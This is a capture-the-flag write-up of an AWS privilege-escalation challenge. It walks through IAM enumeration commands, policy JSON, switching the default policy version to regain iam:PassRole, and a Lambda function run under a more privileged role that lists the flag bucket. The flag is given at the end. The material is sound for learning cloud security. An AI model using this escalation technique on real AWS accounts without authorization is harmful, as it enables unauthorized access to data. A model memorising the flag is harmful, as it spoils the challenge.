# Squ1rrel CTF 2025

## Challenge: cloud/escalate

In order to get access to this challenge, you must first complete metadata \[the previous cloud challenge\]. To start this challenge, make a ticket with your team name to request an AWS account for your team. (Only one AWS account per team!)

This AWS account is considered CTF infrastructure. If you find a way to escalate into another account, to administrator, or similar, please let us know — this is not intentional, and while you can (of course) use it to get the flag, abusing any exploit of this type will lead to disqualification. Additionally, intentionally taking any action that costs money on the AWS account will lead to disqualification — please don’t brute force AWS API endpoints or create resources that aren’t covered by the free tier. Please make a ticket if you're unsure about what's allowed!

## Difficulty
21 solves / 481 points

## Solution

Once I have the AWS creds, my goal is to figure out what I can do.
At first, I use the AWS CLI, running commands such as `aws iam list-roles` as well as more to get a sense of what is around.
This reveals a MagicRole that has the ability to execute lambdas
```json
        {
            "Path": "/",
            "RoleName": "MagicRole",
            "RoleId": "AROA5EURRCE6EVMADOHBR",
            "Arn": "arn:aws:iam::903322079548:role/MagicRole",
            "CreateDate": "2025-04-05T04:06:30+00:00",
            "AssumeRolePolicyDocument": {
                "Version": "2012-10-17",
                "Statement": [
                    {
                        "Effect": "Allow",
                        "Principal": {
                            "Service": "lambda.amazonaws.com"
                        },
                        "Action": "sts:AssumeRole"
                    }
                ]
            },
            "MaxSessionDuration": 3600
        }
```
This is clearly very interesting and worth analyzing. I then ran 
```
aws iam list-attached-role-policies --role-name MagicRole
```
which revealed the MagicPolicy. Then I ran 
```
aws iam get-policy-version --policy-arn arn:aws:iam::903322079548:policy/MagicPolicy --version-id v1
```
to try and better understand the policy, yielding
```json
{
    "PolicyVersion": {
        "Document": {
            "Version": "2012-10-17",
            "Statement": [
                {
                    "Effect": "Allow",
                    "Action": "s3:ListBucket",
                    "Resource": "arn:aws:s3:::squ1rrel-ctf-flags"
                },
                {
                    "Effect": "Allow",
                    "Action": [
                        "logs:CreateLogGroup",
                        "logs:CreateLogStream",
                        "logs:PutLogEvents"
                    ],
                    "Resource": "*"
                }
            ]
        },
        "VersionId": "v1",
        "IsDefaultVersion": true,
        "CreateDate": "2025-04-05T04:06:30+00:00"
    }
}
```
This shows that there's an s3 bucket that contains the ctf flags, and so almost certainly where the flag is.
However, none of this tells me anything about my own permissions.

At this point, I shift gears and run `aws sts get-caller-identity` to get my own identity
followed by `aws iam list-attached-role-policies --role-name ctfuser` but this is denied.

At this point, I switched to the AWS Web GUI. I clicked around to reach [an aws policies link](https://us-east-1.console.aws.amazon.com/iam/home?region=us-east-1#/policies)
which showed me 
![image](https://github.com/user-attachments/assets/1cff941f-5ad6-44bc-b425-2bf1a0869a1b)

Clicking on the UserPolicy, and jsonifying the policy yields
```json
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Effect": "Allow",
            "Action": [
                "iam:SetDefaultPolicyVersion",
                "iam:ListRoles",
                "iam:GetRole",
                "iam:ListPolicies",
                "iam:ListPolicyVersions",
                "iam:ListAttachedRolePolicies",
                "iam:GetPolicy",
                "iam:GetPolicyVersion",
                "iam:ListEntitiesForPolicy",
                "lambda:GetFunction"
            ],
            "Resource": "*"
        },
        {
            "Effect": "Allow",
            "Action": [
                "lambda:CreateFunction",
                "lambda:InvokeFunction",
                "lambda:UpdateFunctionCode",
                "lambda:UpdateFunctionConfiguration",
                "lambda:DeleteFunction",
                "lambda:ListFunctions"
            ],
            "Resource": "*"
        }
    ]
}
```
I do not know why the AWS CLI `list-attached-role-policies` did not work, but regardless I now have an exact list of what I can do.
Interestingly there is also a v1 version of this, where I also get the `"iam:PassRole"` command. However, v2 is the default.

At this point, I realize I need to create a lambda with the MagicRole, which will then access the s3 flag bucket on my behalf.
To do that, I need to be able to `PassRole` but thankfully, I have `"iam:SetDefaultPolicyVersion"` so I can just set v1 to the default.

Now I create a lambda with the MagicRole with the following code
```python
import json
import urllib.parse
import boto3

print('Loading function')

s3 = boto3.client('s3')


def lambda_handler(event, context):
    #print("Received event: " + json.dumps(event, indent=2))

    # Get the object from the event and show its content type
    try:
        response = s3.list_objects_v2(Bucket='squ1rrel-ctf-flags')
        print(response)
        return response
    except Exception as e:
        print(e)
        print("Sad")
        raise e
```
I make a test trigger, and that gives me the flag.

`squ1rrel{dont_you_love_aws}`
